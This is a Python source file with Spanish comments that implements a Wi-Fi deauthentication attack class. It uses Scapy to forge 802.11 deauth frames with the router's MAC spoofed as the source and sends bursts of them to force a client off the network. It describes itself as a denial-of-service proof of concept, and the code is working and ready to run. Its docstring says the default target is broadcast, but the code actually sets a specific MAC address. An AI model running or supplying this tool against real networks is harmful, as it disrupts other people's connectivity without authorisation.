from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

class DeauthAttacker:
    """Clase para ejecutar pruebas de concepto de Denegación de Servicio (Deauth)."""

    @staticmethod
    def start_attack(interface: str, bssid: str, client: str = "BC:6E:E2:39:79:C5", count: int = 50):
        """
        Construye y envía ráfagas de paquetes de desautenticación.
        
        :param interface: La interfaz en modo monitor (ej. wlan0mon)
        :param bssid: La dirección MAC del router objetivo
        :param client: La MAC del cliente a expulsar (por defecto FF:FF:FF:FF:FF:FF para todos)
        :param count: Número de paquetes a enviar por ráfaga
        """
        print(f"\n[\033[93m!\033[0m] Preparando paquete Deauth contra BSSID: \033[1m{bssid}\033[0m")
        
        # 1. Capa Dot11 (Falsificamos la identidad del router)
        # addr1 = Destino (Cliente o Broadcast)
        # addr2 = Origen (MAC del Router suplantada)
        # addr3 = BSSID (MAC del Router)
        dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
        
        # 2. Capa de Desautenticación (Razón 7 es estándar para expulsiones)
        deauth_layer = Dot11Deauth(reason=7)
        
        # 3. Ensamblamos el paquete final
        paquete = RadioTap() / dot11 / deauth_layer
        
        print(f"[\033[91m*\033[0m] Fuego a discreción. Enviando {count} paquetes a {client}...")
        
        try:
            # Enviamos el paquete a nivel de enlace de datos (sendp)
            # inter=0.1 pone una pausa de 100ms entre paquetes para no saturar tu propia tarjeta
            sendp(paquete, iface=interface, count=count, inter=0.1, verbose=False)
            print("[\033[92m+\033[0m] Ráfaga completada.")
        except PermissionError:
            print("[\033[91m-\033[0m] Error: Necesitas permisos de root (sudo) para inyectar paquetes.")
        except Exception as e:
            print(f"[\033[91m-\033[0m] Error de inyección: {e}")